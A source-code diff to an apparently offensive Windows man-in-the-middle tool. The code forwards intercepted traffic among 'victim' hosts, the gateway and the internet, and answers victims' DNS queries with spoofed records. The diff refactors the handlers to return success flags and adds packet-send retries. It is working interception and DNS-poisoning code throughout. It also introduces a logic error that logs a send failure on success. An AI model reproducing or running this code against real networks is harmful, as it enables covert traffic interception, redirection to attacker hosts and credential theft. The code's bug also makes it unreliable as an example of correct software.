@@ -18,6 +18,8 @@
 #include "NetworkHelperFunctions.h"
 #include "PacketProxy.h"
 
+#define MAX_INJECT_RETRIES 4
+
 
 extern PSYSNODE gTargetSystemsList;
 extern PRULENODE gFwRulesList;
@@ -77,6 +79,7 @@ DWORD WINAPI ForwardPackets (LPVOID lpParam)
     goto END;
   }
 
+  LogMsg(DBG_INFO, "ForwardPackets(): Enter listening/forwarding loop.");
   while ((funcRetVal = pcap_next_ex((pcap_t*)scanParams.InterfaceWriteHandle, (struct pcap_pkthdr **) &packetHeader, (const u_char **)&packetData)) >= 0)
   {
     if (funcRetVal == 1)
@@ -85,11 +88,19 @@ DWORD WINAPI ForwardPackets (LPVOID lpParam)
     }
   }
 
-  LogMsg(DBG_INFO, "ForwardPackets(): Listener started. Waiting for replies ...");
+  if (funcRetVal < 0)
+  {
+    char *errorMsg = pcap_geterr(scanParams.InterfaceWriteHandle);
+    LogMsg(DBG_ERROR, "ForwardPackets(): Listener stopped unexpectedly with return value: %d, %s", funcRetVal, errorMsg);
+  }
+  else
+  {
+    LogMsg(DBG_INFO, "ForwardPackets(): Listener stopped regularly with return value: %d", funcRetVal);
+  }
 
 END:
 
-  LogMsg(DBG_ERROR, "ForwardPackets(): Exit");
+  LogMsg(DBG_INFO, "ForwardPackets(): Exit");
 
   return retVal;
 }
@@ -130,20 +141,29 @@ void PacketForwarding_handler(u_char *param, const struct pcap_pkthdr *pktHeader
   // Firewall checks
   if ((firewallRule = FirewallBlockRuleMatch(gFwRulesList, packetInfo.proto, packetInfo.srcIpBin, packetInfo.dstIpBin, packetInfo.srcPort, packetInfo.dstPort)) != NULL)
   {
-    ProcessFirewalledData(&packetInfo, scanParams);
+    if (ProcessFirewalledData(&packetInfo, scanParams) == FALSE)
+    {
+      LogMsg(DBG_ERROR, "Unable to apply firewall rules");
+    }
   }
 
   // Destination IP is GW
   else if (memcmp(&packetInfo.ipHdr->daddr, scanParams->GatewayIpBin, BIN_IP_LEN) == 0)
   {
-    ProcessData2GW(&packetInfo, scanParams);
+    if (ProcessData2GW(&packetInfo, scanParams) == FALSE)
+    {
+      LogMsg(DBG_ERROR, "Unable to send DATA 2 GW");
+    }
     
 
   // Destination is victim system
   }
   else if ((realDstSys = GetNodeByIp(gTargetSystemsList, (unsigned char *) &packetInfo.ipHdr->daddr)) != NULL)
   {
-    ProcessData2Victim(&packetInfo, realDstSys, scanParams);
+    if (ProcessData2Victim(&packetInfo, realDstSys, scanParams) == FALSE)
+    {
+      LogMsg(DBG_ERROR, "Unable to send DATA 2 VICTIM");
+    }
 
 
   /*
@@ -153,38 +173,46 @@ void PacketForwarding_handler(u_char *param, const struct pcap_pkthdr *pktHeader
   }
   else
   {
-    ProcessData2Internet(&packetInfo, scanParams);
+    if (ProcessData2Internet(&packetInfo, scanParams) == FALSE)
+    {
+      LogMsg(DBG_ERROR, "Unable to send DATA 2 INTERNET");
+    }
+    else
+    {
+      LogMsg(DBG_ERROR, "Unable to send ANYWHERE");
+    }
   }
 }
 
 
 
-void ProcessData2Internet(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
+BOOL ProcessData2Internet(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
 {
+  BOOL retVal = FALSE;
   PHOSTNODE tmpNode = NULL;
 
   // When user sends DNS request to an external DNS server, send back
   // a spoofed answer packet.
   if (packetInfo->udpHdr != NULL &&
-      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL &&
-      DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, tmpNode, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp) == TRUE)
+      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
   {
     LogMsg(DBG_DEBUG, "Request DNS poisoning C2I succeeded : %s -> %s", tmpNode->Data.HostName, tmpNode->Data.SpoofedIp);
-    return;    
+    return DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, tmpNode, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp);
   }
 
   CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->GatewayMacBin, BIN_MAC_LEN);
   CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "OUT");
 
-  pcap_sendpacket(((pcap_t *)scanParams->InterfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
+  return SendPacket(MAX_INJECT_RETRIES, scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
 }
 
 
 
-void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAMS scanParams)
+BOOL ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAMS scanParams)
 {
   PHOSTNODE tmpNode = NULL;
+  BOOL retVal = FALSE;
   char spoofedDnsPacket[8192] = { 0 };
   int spoofedDnsPacketLen = 0;
   
@@ -195,43 +223,43 @@ void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAM
   // When user receives DNS response, send back
   // a spoofed answer packet.
   if (packetInfo->udpHdr != NULL &&
-      (tmpNode = (PHOSTNODE)DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL &&
-      DnsResponseSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, tmpNode, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp) == TRUE)
+      (tmpNode = (PHOSTNODE)DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
   {
     LogMsg(DBG_DEBUG, "Request DNS poisoning *2C succeeded : %s -> %s", tmpNode->Data.HostName, tmpNode->Data.SpoofedIp);
-    return;
+    return DnsResponseSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, tmpNode, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp);
   }
 
-  pcap_sendpacket((pcap_t *)scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
+  return SendPacket(MAX_INJECT_RETRIES, scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
 }
 
 
-
-void ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
+BOOL ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
 {
   PHOSTNODE tmpNode = NULL;
 
   // When user sends DNS request to the gateway, send back
   // a spoofed answer packet.
   if (packetInfo->udpHdr != NULL &&
-      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL &&
-      DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, tmpNode, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp) == TRUE)
+      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
   {
-    LogMsg(DBG_DEBUG, "Request DNS poisoning C2GW succeeded : %s -> %s", tmpNode->Data.HostName, tmpNode->Data.SpoofedIp);
-    return;
+//LogMsg(DBG_DEBUG, "Request DNS poisoning C2GW succeeded : %s -> %s", tmpNode->Data.HostName, tmpNode->Data.SpoofedIp);
+    return  DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, tmpNode, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp);
   }
 
   CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->GatewayMacBin, BIN_MAC_LEN);
   CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "GW");
-  pcap_sendpacket(((pcap_t *)scanParams->InterfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
+  
+  return SendPacket(MAX_INJECT_RETRIES, scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
 }
 
 
 
-void ProcessFirewalledData(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
+BOOL ProcessFirewalledData(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
 {
   LogMsg(DBG_INFO, packetInfo->logMsg, "BLOCK");
+
+  return TRUE;
 }
 
 
@@ -277,4 +305,23 @@ void PrepareDataPacketStructure(u_char *data, PPACKET_INFO packetInfo)
   {
     strcat(packetInfo->proto, "Unknown");
   }
+}
+
+
+
+BOOL SendPacket(int maxTries, LPVOID writeHandle, u_char *data, unsigned int dataSize)
+{
+  BOOL retVal = FALSE;
+  int counter = 0;
+
+  for (; counter < maxTries; counter++)
+  {
+    if (pcap_sendpacket(writeHandle, data, dataSize) == 0)
+    {
+      retVal = TRUE;
+      break;
+    }
+  }
+
+  return retVal;
 }
